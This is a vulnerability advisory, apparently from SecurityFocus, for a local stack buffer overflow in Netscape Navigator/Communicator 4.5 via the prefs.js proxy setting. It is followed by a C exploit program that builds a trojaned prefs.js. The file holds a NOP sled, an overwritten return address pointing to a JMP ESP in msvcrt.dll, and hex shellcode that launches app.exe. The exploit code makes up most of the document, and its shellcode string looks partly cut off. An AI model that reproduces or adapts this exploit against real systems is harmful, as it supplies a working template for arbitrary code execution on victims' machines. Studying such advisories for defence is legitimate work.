source: http://www.securityfocus.com/bid/893/info

Netscape Communicator 4.5 has an unchecked buffer, through which code can be injected for execution via the prefs.js preferences file. This could be exploited locally to run arbitrary code at the privilege level of the current user.

The buffer is overrun if a value over 80 bytes is specified in the 'network.proxy.http' field in prefs.js . The following 4 bytes are written to EBP and the 4 after that go into EIP. The next byte is pointed at by the ESP and is the beginning of the code that will be run. 

/* Stack based buffer overflow exploit for Netscape Navigator 4.5
* Author Steve Fewer, 22-12-99. Mail me at darkplan@oceanfree.net
*
* Netscape Navigator causes a buffer overflow when reading from
* the users "prefs.js" file. If it reads a string longer than 80
* bytes in the user_pref("network.proxy.http", "proxy.com");
* field it smashes the stack overwrighting the EIP and EBP. This
* can be used to execute arbitrary code.
*
* Tested with Netscape Navigator 4.5 using Windows98 on an Intel
* PII 400 with 128MB RAM
*
* http://indigo.ie/~lmf
*/

#include <stdio.h>
#include <string.h>

int main()
{

printf("\n\n\t\t........................................\n");
printf("\t\t.....Netscape Navigator 4.5 exploit.....\n");
printf("\t\t........................................\n");
printf("\t\t.....Author: Steve Fewer, 22-12-1999....\n");
printf("\t\t.........http://indigo.ie/~lmf..........\n");
printf("\t\t........................................\n\n");

// the first 80 bytes. These get blown away when the stack goes down.
char buff[96];
// the EBP, we don't need to use it so fill it with B's
char ebp[8] = "BBBB";
// we point the EIP into msvcrt.dll v6.00.8397.0 where we find a JMP ESP
@ 7FD035EB
char eip[8] = "\xEB\x35\xD0\x7F";
// the is our 'arbitrary code', it just runs a file app.exe from the
\WINDOWS\COMMAND directory then calls exit() to clean up
char sploit[128] =
"\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x61\xC6\x45\xF9\x70
\xC6\x45\xFA\x70\xC6\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78\xC6
\x45\xFE\x65\xB8\x24\x98\x01\x78\x50\x8D\x45\xF8\x50\xFF\x55\xF4\x55
\x8B\xEC\xBA\xFF\xFF\xFF\xFF\x81\xEA\xFB\xAA\xFF\x87\x52\x33\xC0\x50\xFF\x55\xF
";
FILE *file;
for(int i=0;i<80;i++)
{
buff[i] = 0x90;
}
// just create our new, 'trojand' prefs.js file
file = fopen("prefs.js","wb");
// and slap in the the nasty sploit
fprintf(file,"user_pref(\"network.proxy.http\", \"%s%s%s%s\");", buff,
ebp, eip, sploit);

printf("\t created file prefs.js loaded with the exploit.\n");

return 0;
}